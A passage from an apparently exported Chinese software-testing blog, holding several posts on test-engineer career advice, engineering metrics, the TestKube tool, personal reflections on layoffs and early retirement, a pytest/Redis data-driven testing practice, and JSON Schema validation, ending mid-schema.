相比于成为某种工具或者编程语言的专家，测试开发工程师可能更有必要成为一名通才，我们最核心的观念应该是帮助团队满足用户的需求和期望。\n因此除了功能测试和自动化测试之外，我们是需要学习其他领域的知识，比如性能测试，可用性测试，可测试性，安全测试，移动端测试，可视化测试和数据测试。\n技术已经发展了很多年，我们几乎每天都有许多领域和新技能需要学习。让我们探索一些可以帮助你提升自动化工程师职业生涯的领域：\n探索性测试\n老生常谈的话题了，探索性测试可以叫做老司机测试，但探索性测试并不是随心所以，而是需要精心计划和设计一些测试用例。我们可以通过探索性测试来开阔用例设计的思路，从而改进我们的e2e（也就是ui）测试用例。《Explore It!: Reduce Risk and Increase Confidence with Exploratory Testing》阅读这本书可能是一个不错的开始，不过我好像并没找到中文版本，有点可惜了。\n数据测试\n机器学习和人工智能每天都在使用数据，但数据的有效性还是要验证的。我的建议是开始学习数据模型的性能，这有助于我们弄清楚一些 ML预测错误的具体场景。\n可视化测试\n其实就是ui测试了，ui是产品和用户打交道的最终途径，很多情况下也是唯一途径，生产环境中的视觉错误会危及我们的声誉并影响我们的品牌，所以ui的测试是非常必要的，也是需要我们去花精力学习的。\n可访问性测试\n正如您可能知道的那样，许多国家/地区的法律法规要求让每个人都可以访问应用程序，并且创建一种必须适合所有人的软件应用程序文化。比如产品对盲人用户的可访问性就是一个很好的例子。我们可以从https://www.w3.org/WAI/WCAG21/quickref/开始进行学习。\n安全测试\n就法律处罚和品牌声誉而言，安全漏洞往往代价高昂。我们应该在CI 的pipeline中增加安全扫描的环境。我的建议是开始阅读OWASP和学习一些安全测试工具。\n混沌测试\n混沌测试/混沌工程测试是在影响客户之前发现漏洞和进行中断。简而言之，我们希望系统是可以在受控的环境中进行错误恢复的。如果你想学习混沌测试，那么《Chaos Engineering: System Resiliency in Practice》这本书将是一个不错的开始。\n获得正确的帮助 获得他人的支持可以加速学习周期并显着改善您的职业生涯。但是，首先得找一个你信任的导师，他已经掌握了你想学习的技能，这些技能可以是技术技能或软技能。\n我的建议是你问问自己：“我公司或我的人脉网中谁会注意到我的变化并为我提供诚实的反馈？” 有时候找导师可能很困难，我们希望有最好的老师来指导我们。如果你在你的社交网络中找不到导师，你可以要求你的上级提供高质量的指导。\n“如果你想快点走，就一个人走。想走远一点，就一起走”\n自动化不仅仅是执行测试脚本 这个很好理解，自动化的目的是什么？大家可能有自己的答案，但答案一定不会是执行用例并使其通过。\n其实我总结自动化的目标是帮助团队从质量和效率的维度满足用户的预期。\n质量很好理解，我们不希望用户用到全是bug的产品；效率也不难想象，我们希望用户可以尽快的用到产品。\n分享也是学习的一种途径 正如你可能知道的那样，教导他人可以提高你自己的学习能力。记得之前看到过一个学习的方法就是先自己学一遍，然后把自己学到的东西讲给别人去听，如果别人能弄明白，那么你自己就学会了。\n另外积极的分享可以提高沟通技巧，增强信心，提高领导能力。\n我的建议是强迫自己去做，把教学日期放在你的日历上，或者同意主持几个月的培训课程。有了这些目标，你学习将更加专注和实用，我们在质量保障上可以不立flag，但是在分享学习上flag可以适当的立起来。\n最后 知识被认为是人类历史上最宝贵的财富。如果你打算在自动化工程师的职业生涯中有所提高，持续学习之旅就不会出错。\n正如圣雄甘地所说：“活得像明天就要死一样。活到老，学到老”。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%BB%99%E6%B5%8B%E8%AF%95%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%845%E6%9D%A1%E5%BB%BA%E8%AE%AE/","title":"给测试开发工程师的5条建议"},{"content":"当Mojtaba Hosseini帮助指导Zapier成为一个更加以数据和指标为导向的工程组织时，当团队继续增加和使用指标时，他发现他们有时会遇到这个问题。我还应该注意和使用哪些指标？\n让我们加入Mojtaba的另一个嘉宾系列，他将探讨5类工程指标，这些指标可以帮助团队实现指标的多样化和平衡化\n但首先，打个比方\u0026hellip;\n想想一个汽车的主仪表盘。\n有许多指标和表盘，每个都以不同的方式帮助司机。\n速度和性能：汽车的速度有多快？发动机的工作强度如何？ 维护：发动机健康状况，机油和电池健康状况，汽油水平，发动机温度。 状态：车门、后备箱、引擎盖开/关，灯开/关，指示灯开/关，手刹开/关。 汽车越复杂，这些类别中的表盘和仪表盘就越多。如果司机只能接触到一个类别，他们可能会损坏汽车（或更糟）。\n工程测量的5个类别 可以说，工程团队可以使用的指标有5类。\n客户指标 这些指标主要是衡量团队的客户情况。这个类别的指标包括\n客户净推荐值(NPS，可以理解为口碑) 产品HEART指标。幸福感、参与度、采用率、留存率、任务完成率 关于我们对客户咨询的反应速度的SLI指标 这些通常被认为是一个团队最重要的一些指标，因为它们涉及到团队的客户。然而，这些指标可能是滞后指标，可能无法让团队充分了解客户满意（或不满意）的原因。\n团队工作量指标 一些团队发现衡量团队的工作量是很有用的，可以深入了解各种类别的工作量。比如说。\n参与到feature开发工作与非feature开发工作的百分比 团队的支持工作的负荷及其对整体工作量的影响 团队的bug fixing工作的负荷及其对整体工作量的影响 战术性工作与战略性工作的百分比 这些指标可以帮助团队理解和阐述他们的痛点，甚至有时可以与客户指标联系起来。它们有时也能揭示出团队以外的问题和瓶颈，这些问题和瓶颈影响了团队的工作量。\n团队效能指标 如果说团队工作量指标衡量的是团队的工作投入，那么团队绩效指标的目的是看团队在处理工作量方面的情况。比如说。\n周期时间和吞吐量以及在制品（WIP 半成品）的大小：团队如何处理其工作负荷 4个DORA指标：一个团队部署到生产的速度和频率以及这些部署的质量，可以参考这篇文章:https://cloud.google.com/blog/products/devops-sre/using-the-four-keys-to-measure-your-devops-performance 团队速度：完成需求的平均速度 这些指标通常是最有可能被管理层错误使用的指标\u0026ndash;最糟糕的是被武器化。如果使用得当，它们是团队工作量和客户指标的绝佳配套指标。\n服务水平度量 软件团队也可以衡量他们维护的服务的健康状况。比如说。\n资源使用率（CPU/内存）：服务使用资源的程度，通常在一段时间内查看 (云）成本：资源的成本（通常会进一步细分），通常会随着时间的推移查看 服务正常运行时间：服务正常运行的时间百分比 服务错误率：一项服务出错或超时的频率 请看这篇来自亚马逊的文章，关于服务指标的各个层次以及为运营可见性创建仪表盘。https://aws.amazon.com/cn/builders-library/building-dashboards-for-operational-visibility/\n请注意，对于一些团队，这些服务指标与客户指标有直接或间接的关系\u0026ndash;当客户是服务的直接用户时，甚至可能是客户指标。\n团队幸福感/参与度 另一类指标是围绕着团队的参与度和幸福感。一些例子包括。\n员工参与度调查 高功能团队调查 工作量和战略的模糊性调查 这些指标旨在平衡一些绩效、工作量和客户指标与团队参与度。例如，参与的团队往往是高绩效的团队。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%B7%A5%E7%A8%8B%E5%BA%A6%E9%87%8F%E7%9A%845%E4%B8%AA%E7%B1%BB%E5%88%AB/","title":"工程度量的5个类别"},{"content":"之前我们自己开发过一些基于k8s的执行用例执行工具，原理大致是在用例执行的时候动态去k8s上创建容器，执行任务，上报指标，最后销毁容器，不过这些过程基本上与测试过程耦合在一起，难以平移扩展。最近发现了一款在开发早期的通用型的基于k8s的用例执行工具: TestKub。\n有用的链接 项目主页：TestKube (kubeshop.github.io) 代码库：GitHub - kubeshop/testkube: Kubernetes-native framework for test definition and execution 特性 支持执行postman collection 支持执行cypress的ui测试用例 支持执行基于curl的简单探活，比如站点，接口有没有挂的检测之类 工具希望解决的实际问题 避免vender锁定 CI/CD 管道中的测试编排和执行 在集群中轻松编排和运行任何类型的测试 - 功能、负载/性能、安全性、合规性等 - 无需将它们打包成在 docker-images 或提供网络访问 使测试执行与构建过程分离成为可能； 工程师应该能够在需要时运行特定的测试 以一致的格式集中所有测试结果，以实现“可操作的 QA 分析” 提供模块化架构以添加新类型的测试脚本和执行器 简单来说就是提供了与ci/cd解耦的纯测试容器编排和执行能力，并提供了统一的报告输出。\n主要模块 kubectl 插件 API Server - 调度器，执行器，收集执行结果 CRDs Operator - 观看 TestKube CR，处理与 API Server 通信的更改 Executors - 运行为特定运行程序定义的测试，目前可用于 Postman、Cypress 和 Curl 结果数据库 - 用于集中测试结果管理 一个简单的基于浏览器的看板，用于监控测试结果 总结 这里就不列举如何安装以及简单使用该工具进行用例执行了，目前TestKube的版本是0.6，还处在早起的开发阶段，不过项目的文档较为全面，而且模块化良好，有一定的扩展性，所以后面可能吸引一些使用者，有强烈需求的同学可以直接拿来就用，拿不定主意的同学建议再观察一定时间，等到1.0版本再入坑。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%9F%BA%E4%BA%8Ek8s%E7%9A%84%E6%B5%8B%E8%AF%95%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7testkube/","title":"基于k8s的测试执行工具：TestKube"},{"content":"最近在一些微信群里看到某互联网大厂裁员的消息，跟老同事确认了一下，他们部门的指标是20%，5个人里就要走1个，冰冷的数字背后是一个个鲜活的身影，一段段故事以及一声声的叹息和一阵阵的无奈，作为从业者，也不免有鸟尽弓藏兔死狐悲之感。\n作为一个35岁以上，可能会被大部分用人企业所婉拒的老互联网人，老测试人，我今天一直在思考，假如我被裁员了那应该怎么办？\n还完房贷 我想第一步可能是想尽办法还清房贷。这可能有点反直觉，丢了工作难道不应该先开源节流吗？房贷等与是长期定投，而且相对来说利率是较低的，失业之后把现金流丢到房贷里去岂不是没有任何的抗风险的空间了吗？其实我们可以反过来想，如果现在手上有些资金不去还房贷，那么很可能会去想办法创业或换个赛道做些自己不擅长的事情，这样一来如果投资或者创业失败，就目前的经济情况来看市场普遍缺乏信心，投资获益的可能性是比较低的，假如一不小心蚀了本金，那么房贷就难以为继，最后断供法拍，征信受损，大家可以了解一下失信的惨重代价。所以还清房贷，降低未来几十年的利息支出反而是更理智的选择。另外没有了房贷，每个月的生活成本其实是要低不少的，这样生存的压力也会相应降低，一石二鸟，何乐而不为。\n节流节流 今年居民负债率没有提升，可能是因为大家手上真的没钱了吧。没有富余的资金，杠杆也撬不动空气。如果在这个节骨眼上没有了收入，那么我会选择尽量的降低生活成本，先活下去熬过这段时间，如果整个社会对经济都没有期待，那么经济的复苏反而指日可待。节流的方式有很多种，比如每天老老实实买菜在家里做饭，尽量少出行，不仅省钱还能预防新冠，卖掉一切不需要的东西，比如汽车，这样可以省油费，停车费和保险费用；停掉一切可能产生账单的服务，比如注销掉之前因工作需要而办理的手机号，停掉有线电视等等。这样算下来一天100块的话一家三口就可以生活下去，一年只需要3.6万，加上其他的一些成本和支出，一年最低的生活成本大概在5万，如果稳健理财每年的年化收益是4%的话，那么有125万的本金就可以完全靠利息苟延残喘下去，寒冬总会过去，现在步入黑暗，但我仍然心向光明。\n坚持交社保和保险 社保是一种对未来的投资，坚持交其实就是对未来不确定性的对冲，不过现在社保和商业保险的成本还是比较高的，应该是苟活阶段家庭年度支出的大头。\n锻炼身体 前几天看到一个数据，大约在2050年，全球65岁以上人口的数量将是5岁以下人口数量的两倍。所以等我们这代人老去的时候，将是全球步入人口老龄化的时候。掐指一算，还有28年，按照中国人口结构和医疗水平推算，这个时间点可能会来的更早一些。最近一年见过一些生老病死，经历了一些世事无常，强烈的感觉到等我们步入老年之后\n身体的健康和神智的清晰是最大的福报 社会上应该有不少岗位会向高龄人群开放 假如未来真是这样的话，为什么不在社会对35岁左右群体横眉冷对的时候蛰伏一段时间，锻炼好身体，不让年轻时候的工作透支年老时的健康，积极学习，跟上时代的脚步，过些年之后，当最后一波人口生育高峰的红利过去，也许届时会有更好的复出和发展的机会。总之健康生活的越久，在未来的社会可能会越有竞争力。\n开源开源 做一些低成本的小生意，能赚就赚到，赚不到就当交了学费，当成是提升自我的必要投资。如果恩格尔系数过高，那么想办法种点菜补贴家用，灵活就业，赚不了大钱但心态好些就当是体验了生活。\n读万卷书或行万里路 合格勤勉的打工人是没有太多时间读书充实自己的。没有工作了可以多读书，一来可以了解这个世界是如何运转的，二来可以通过不同人群的视角去展望未来，也许以后的机会就在我们对未来的憧憬中慢慢萌芽。低成本的行万里路真正让我们认识到这个世界，尽管我们是农耕民族，但迁移的基因也许从我们的祖先由非洲出走时就扎根在了我们的基因里，我们大部分人还是希望在有生之年可以亲眼看一看更大的世界。另外时不我待，前几天我去爬了座山，强烈的感受到如果年纪再稍微大一些，那么这项运动可能会跟我割席断交，失之交臂，当时就感叹，有些事情应该趁年轻去做。工可以留着年纪大了再打，毕竟从趋势上看，未来是属于老年人的，到时候孩子也长大了，每天睡的时间也少了，吃的也不多了，心态也更加平和了，模范的打工人就这么完美的炼成了。读书的经济成本不高，不过难在坚持，旅行与节流冲突，需要权衡和取舍。\n培养一门爱好 有一门爱好可以全身心投入的话，那么人可能就不会那么焦虑吧。不过爱好除了投入时间之外还需要持续投入金钱，在经济压力比较大的情况下，一些烧钱的爱好可能就不太方便参与了。\n多陪陪家人 打工的时候春节假期往往令人矛盾，想回老家跟家人团聚，奈何时间紧票难买；想多请几天假，奈何卷王当道，难以启齿。没有工作了终于可以多陪陪家人了，亲情也是一种治愈，能让人不那么焦虑。\n总之 如果在这个时间节点我没有了工作，在有选择的情况下，我会跟家里人沟通，告诉他们我想先退一步海阔天空，调整好身体状态和心态，尽可能长的苟延残喘一段时间，然后充实自己，等待合适的机会复出；如果没有选择的话，我会默默的找出之前的简历，然后在开头加上一段话：“xx年工作经验，xx年管理经验，沟通能力强，有很强的抗压能力，能够适应高强度的工作”，加粗保存，发给之前有联系的一众猎头。最后盘算着离职补偿可以撑多久，从撑不住的那天倒推，给自己的求职行为立项，定目标，编okr，最后跟家人对齐deadline。好一似食尽鸟投林，落了片白茫茫大地真干净！\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%81%87%E5%A6%82%E6%88%91%E8%A2%AB%E8%A3%81%E5%91%98%E4%BA%86/","title":"假如我被裁员了"},{"content":"最近躺平几乎成了内卷的反义词，我了解了一下躺平最初的由来，发现是源自百度贴吧，帖子的主人公过着消费极低而且自在悠闲的生活。没有钱了就去横店躺平扮演尸体，赚了一点点钱就不再工作，反正他的消费非常少，躺几天尸够他活个一阵子了。\n这种生活方式突然受到了追捧，当然，很多人只是说说而已，真让他们去躺平难度还是非常大的，毕竟上有老下有小，现实总是不能允许你做任性的事情。这可能表现了喝彩者对内卷化下意识的反对和厌恶，也算是反内卷方程式的一个潜在的解法。\n我不知道内卷是不是经济发展变缓这个特殊缓冲区的产物。因为之前经济高速增长，人们已经有了努力就能获得一切的惯性，当经济稍微停滞一些的时候，努力的惯性也许就成了内卷的核反应堆。等经济增速回归到一个较低水平的时候，也许各种花式躺平就成了主流，比如现在的台湾和日本，到时候可能一部分人卷上加卷，大部分人默默躺平。这也没什么不好，之前旅行的时候经过一些小城市，穿梭在人流中竟然感受到了许久不见烟火气，心里也曾经有过这样一个念头，假如有一天我躺平了，我会做些什么？\n如何生存 做为一个测试人，我总是信奉一条原则，在项目越早期想的越多越清楚，后面的坑可能就会相对少一些。所以在躺平之前，我应该会重点思考一个问题，那就是生存还是毁灭的终极问题。\n躺平了就意味着不能在职场打工干饭了，因为如果打工的话，你的身体告诉你要躺平，但你的老板却花式要求你要更加努力，修更多福报。\n不能打工如何活下去呢？记得《穷爸爸富爸爸》里就有类似的讨论，不打工可能凭借自己的资产活下去，比如投资的公司的收入，隐形资产比如知识产权的收入。不过这些离我比较遥远，我觉得比较有可能的收入来源是\n稳健理财的收入。长期定期投入的话，可能会有年化5%左右的收入吧； 激进型理财的收入。比如股票和以股票为主的基金收入；我有个朋友曾经跟我分享过一个例子，他有个同事很多年前买了几百万的大头股，现在不仅股票涨了，而且每年都有十几万的分红，过的相当滋润，当然了，这是极其典型的幸存者偏差，大家听完一笑而过就好。另外我也见过有一对台湾夫妻分享他们财务独立的案例，他们定投了十几年的基金，后来财务独立环游世界，这个例子我找到了好几个佐证和类似的例子，所以应该有一定的可行性。好的年份激进型理财的年化收益可能会有10%左右； 零散收入。这部分收入可遇不可求，比如帮别人开发一些自动化工具或者自动化脚本之类的，随缘就好； 潜在收入。学一门手艺，比如木工电工之类的，接一些零活； 总的来说收入主要靠投资和理财，其他的只能随缘，不能糊口。\n下面来算支出。\n房租水电。在一线城市躺平成本比较高，而且周围的人在疯狂搞钱，受他们的影响容易焦虑，所以可以考虑搬去二线城市；一些优质教育资源集中的二线城市的头部学校可能比一线城市的普通学校综合实力更强，也能缓解一些鸡娃焦虑。那么二线城市的房租是多少呢？我随便搜了一下，好点的位置大概5000左右，如果稍微降低一下标准，算上水电等，一年6万应该是可以搞定的； 吃饭。在深圳自己买菜的话，一天100块应该够3口之家吃的很好了；现在物价基本上大部分城市都差不多，所以在吃上面的支出一二线城市100块一天是差不多了，加上偶尔出去吃一顿，那么一年4万应该是可以搞定的； 出行。去二线城市应该可以卖掉现在的车，因为一台车一年的成本差不多要1万块，然后换一个小电驴，周边的出行应该就没大问题了；出远门可以地铁或者打车，想开车自驾的话可以租车，租车很便宜，一天100多一点可以搞定。所以综合算来一年1万左右吧； 穿衣。我自己的衣服很简单，随便找个店买点基本款就可以了，如果住在南方几件t恤就能过一年，所以一年穿衣千把块就可以了。算上全家的一年大概1万左右可以搞定； 其他支出。比如换手机或者买点乱七八糟东西之类的，一年大概2万吧； 这样算下来，总支出应该是6+4+1+1+2=14万，再加上一些无法预计的支出，再放宽2万，一年的生活成本应该是16万。\n如果有400万左右的存款，放100万去做高风险投资，年化10%，300万做稳健理财，大概5%，这样一年的收入应该能有25万，粗茶淡饭一年生活下来，还有9万的盈余可以投入到下一年的激进理财里，因此除了跑不赢通胀的焦虑之外，拿400现金应该就可以躺平了吧。记得前不久有则新闻，一对北京土著夫妻卖了北京的房产，一家三口着1000万去昆明买房定居，其实算下投资收益，他们哪怕找不到工作一家三口平平淡淡过一生也应该足够了吧。\n可以做些什么 不工作的话可以做的事情就很多了。\n旅行。可以自驾也可以公共交通，丰俭由人，预算够的话就稍微放飞一些，预算吃紧就经济一些，行万里路，给生活带来不同的节奏； 读书。可以泡图书馆和书店，书非借不能读也； 带娃。我前几天听说一个数据，中国家庭在义务制教育阶段对孩子的教育投资大概占家庭总收入的12%左右，这还只是平均数，在一线鸡娃焦虑的城市这个数字只会更高，我估计可能有20%以上，所以如果孩子不上各种补习班，自己带孩子出去旅行或者教点什么的话，每年节省的费用是可观的；不过自己教娃很难，我觉得这个比上班累； 学一些实用的技能。比如木工电工自己理发之类的生存能力，做到万事不求人，这样长期看来也能节约不少支出； 学一些不实用的技能。比如英语钢琴之类的，这样可以教娃，省培训班的钱； 打游戏。我觉得我可以在家打一个月的足球经理或者三国志，足不出户； 锻炼身体。这只是说说，哪怕有时间了坚持锻炼身体还是挺难的，不过好的身体可以省药钱，还是要锻炼的； 这样算下来，有400万存款就可以在一个二线城市非常平静的生活下去了，有这样经济能力的人不在少数，起码我身边就有不少。不过大家还是坚持在一线城市卷珠帘，低绮户，照无眠，我猜大概率还是有激情有理想，另外伴随着深深的通货膨胀以及教育焦虑吧。\n其实，偶尔思索一下躺平的事情，你会发现其实放下一切安心生活的成本也没有那么高，也会让自己发现，其实自己真的是有路可退，还有的选。当你有了退路，多了一些选择的时候，你也许就不会那么焦虑，生活或者工作中多了一些从容吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%81%87%E5%A6%82%E6%9C%89%E4%B8%80%E5%A4%A9%E6%88%91%E8%BA%BA%E5%B9%B3%E4%BA%86/","title":"假如有一天我躺平了"},{"content":"最近在搜广推项目里做了一些小小的基于数据驱动的测试尝试。\n因为项目的特殊性，大部分的测试场景其实相对类似，大体可以分为下面几步\n收集数据，整合成1个类似宽表的东西。比如在美团上给外卖投放一个关键字广告，那么投放之前需要收集这个商家的门店信息，比如门店名，经纬度；菜品信息，这个商家有哪些菜品，名字分别是什么；品牌信息，这个商家属于哪个品牌，品牌有哪些特殊属性；这些信息其实都分别在不同的业务表里，开发那边有离线数据流去打宽表，但是对于测试来说，如果不使用自动化的方式的话则需要用sql去查询，遇到有分表的情况则比较麻烦； 构造数据。还是外卖投关键字广告的例子，因为召回的规则和其他一些业务规则，我们投的关键字最好有相关性，比如商家的店名叫做“永久炸鸡”，那么投“炸鸡”这个关键字可能会比较好。所以通过上一步构造好的数据，从里面自动筛选出一些相关数据并进行构造也是必要的； 执行业务并进行断言。以搜索为例，收集数据阶段我们收集了很多的门店信息和菜品信息，那么使用门店名和菜品名进行搜索的话是需要有结果出来的，由于排序规则是算法团队去实现和测试的，所以我这边只需要数据可以搜出来就好，至于排序是什么样子，测试用例里面是不需要去关注的。 综合考虑了一下，我有一个大胆的想法。\n上面这些步骤是不是都可以完全由自动化来实现？\n使用爬虫进行数据收集 测试环境和体验环境我是有数据库权限的，所以可以通过sql来进行数据查询，逻辑其实很简单，从现有的数据里查一些拥有有效菜品的有效商家就好了，所以问题就简化成了使用脚本去连接数据库，然后进行一系列的连表查询就好了。不过因为菜品进行了分表，所以需要一些额外的逻辑去处理一下，不过总的来说还是不难的。\n一切都很顺利，直到业务上线了以后，我发现我需要在线上去收集这些数据。因为安全策略的缘故，开发和测试都是没有线上数据库的访问权限的，因此我在非生产环境里通用的自动化脚本就成了一堆废纸。\n后来有一天，我发现项目的本地测试人员都是在业务后台的各个功能模块里做数据的查询和准备，我突然有了使用爬虫去爬取数据的想法。\n原理其实很简单，模拟业务后台的请求，通过后端暴露的api进行查询，最后想办法把数据组织好存储下来就行了。\n后来用代码简单的实现了一下，效果其实还是不错的，而且完全不需要去顾虑分库分表问题，因为管理后台的api把这些都实现好了。这也让我开阔了一些思路，其实爬虫除了爬外部数据之外，还可以爬内部其他团队的数据，只要业务有管理后台，一切都好说。\n使用redis进行数据存储 爬虫拉到数据之后，就需要对数据进行一些处理和存储。得益于业务api的杰出工作，之前查sql时候需要进行的数据处理现在就变得特别简单，因为业务逻辑都帮我都处理好了，下一步只需要把数据保存起来就好了。\n因为数据需要反复使用和在多个场景下使用，所以存储对于我来说是必须的，但对于另一些场景，存储中间数据可能不是必选项。\n因为对redis相对比较熟悉，所以我这里用redis实现了一些类似索引的东西。\n用set去存储一些实体的主键，比如门店id和菜品id之类； 用string去存储详细信息，比如门店名，菜品的详细信息等；其中门店菜品之类的就直接用的python dict序列化成json string，查询时候通过门店的id就可以直接拿到json string，然后重新反序列化成python字典就好了 使用后端api进行数据创建 对于搜索来说组装好数据基本就可以测了，不过对于广告来说还需要进行广告的创建。这里我是直接调用api做创建，效率高而且不用去页面点。\n使用pytest进行自动化测试 最后就是用例编写了，这里我直接用pytest实现了一些用例，贴一个具体例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @pytest.fixture def data(): r = get_redis() k = r.srandmember(KEY_FOR_TEST) return json.loads(r.get(k)) def test_recall_by_full_store_name_success(data): sname = data[\u0026#39;store_name\u0026#39;] res = query_ads(sname, data[\u0026#39;longitude\u0026#39;], data[\u0026#39;latitude\u0026#39;]) assert \u0026#39;ids\u0026#39; in res, f\u0026#34;{sname} not recall\u0026#34; assert len(res[\u0026#39;ids\u0026#39;]) \u0026gt;= 1 # recall 1 record 这里用fixture来进行测试数据的获取，我准备了一批测试数据，每次随机返回1条，然后通过redis去拿具体数据，比如门店的经纬度信息和门店名。在用例里我判断了可以通过门店名进行召回，至于召回的数据排序是否正确，因为排序规则不属于我的测试范围，所以直接判断可以召回大于1条的数据就好了。\n总结 目前看来这套框架在进行数据驱动的业务测试里还是效率很高的。而且由于爬虫突破了环境的限制，我还可以复用数据构造流程来进行很多的线上问题的排查工作。比如预先爬取线上当天的所有广告信息以及相关的门店菜品等基础信息，一旦线上用户反馈广告无法召回，直接调用调试工具进行重现和调试，问题复现和定位的速度加快了很多。\n最关键的一点是，我实现了项目开始阶段那个有点大胆的想法：整体测试过程完全的自动化。尽管简陋，但是高效，测试开发比1:11，无裁员之乱耳，无加班之之劳形。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%AE%80%E9%99%8B%E7%9A%84%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5/","title":"简陋的全自动化测试实践"},{"content":"当今接口测试越来越重要，一般情况下我们总是会对接口的返回的json字符串进行验证，看返回是否跟我们的预期相符。不过很多情况下我们会遇到下面的问题\n响应结果在测试中不停的发生变动，比如昨天还是3个字段，今天可能返回值里只有2个字段了，测试这边没有比较好的方式感受到后端的变化 我们需要对json的返回值进行一些校验，需要写很多的断言，大部分时候这些断言都是相似的，或者是重复的，比如说校验某个字段的长度必须小于10之类的 那如何解决呢？\n与前后端沟通好返回值的字段，类型以及校验规则，最好有前后端+测试端统一一份合约，大家都按照合约来进行数据的处理 测试的时候通过合约里定义好的校验规则进行数据校验 这时候json schema就派上用场了。\njson schema JSON Schema 是一种 JSON 媒体类型，用于定义 JSON 数据的结构。 JSON 模式旨在定义 JSON 数据的验证，可用于验证响应和请求 JSON。 在 JSON Schema 中，我们可以验证数据类型、字段是否为必填、最小长度或最大长度等。\n举例 下面的数据代表了一个员工的信息\nid: employeeId 员工名称: employeeName 年龄: employeeAge 职称: jobTitle 爱好: hobby 1 2 3 4 5 6 7 8 9 10 { \u0026#34;employeeId\u0026#34;: 1, \u0026#34;employeeName\u0026#34;: \u0026#34;Fulan\u0026#34;, \u0026#34;employeeAge\u0026#34;: 23, \u0026#34;jobTitle\u0026#34;: \u0026#34;SDET\u0026#34;, \u0026#34;hobby\u0026#34;: [ \u0026#34;watch movies\u0026#34;, \u0026#34;play football\u0026#34; ] } 上面的定义其实是有一些疑问的，比如\nid是什么意思 employeeName的最大长度是多少 employeeAge的最小值是什么 jobTitle是必填吗 hobby可以填几个 我们可以通过生成JSON schema来回答上面的问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 { \u0026#34;$schema\u0026#34;: \u0026#34;http://json-schema.org/draft-07/schema\u0026#34;, \u0026#34;$id\u0026#34;: \u0026#34;http://example.com/example.json\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The root schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The root schema comprises the entire JSON document.\u0026#34;, \u0026#34;default\u0026#34;: {}, \u0026#34;examples\u0026#34;: [ { \u0026#34;employeeId\u0026#34;: 1, \u0026#34;employeeName\u0026#34;: \u0026#34;Fulan\u0026#34;, \u0026#34;employeeAge\u0026#34;: 23, \u0026#34;jobTitle\u0026#34;: \u0026#34;SDET\u0026#34;, \u0026#34;hobby\u0026#34;: [ \u0026#34;watch movie\u0026#34;, \u0026#34;play football\u0026#34; ] } ], \u0026#34;required\u0026#34;: [ \u0026#34;employeeId\u0026#34;, \u0026#34;employeeName\u0026#34;, \u0026#34;employeeAge\u0026#34;, \u0026#34;jobTitle\u0026#34;, \u0026#34;hobby\u0026#34; ], \u0026#34;properties\u0026#34;: { \u0026#34;employeeId\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeId\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeId schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: 0, \u0026#34;examples\u0026#34;: [ 1 ] }, \u0026#34;employeeName\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeName\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeName schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;examples\u0026#34;: [ \u0026#34;Fulan\u0026#34; ] }, \u0026#34;employeeAge\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/employeeAge\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The employeeAge schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: 0, \u0026#34;examples\u0026#34;: [ 23 ] }, \u0026#34;jobTitle\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/jobTitle\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The jobTitle schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;examples\u0026#34;: [ \u0026#34;SDET\u0026#34; ] }, \u0026#34;hobby\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;array\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;The hobby schema\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;An explanation about the purpose of this instance.\u0026#34;, \u0026#34;default\u0026#34;: [], \u0026#34;examples\u0026#34;: [ [ \u0026#34;watch movies\u0026#34;, \u0026#34;play football\u0026#34; ] ], \u0026#34;additionalItems\u0026#34;: true, \u0026#34;items\u0026#34;: { \u0026#34;$id\u0026#34;: \u0026#34;#/properties/hobby/items\u0026#34;, 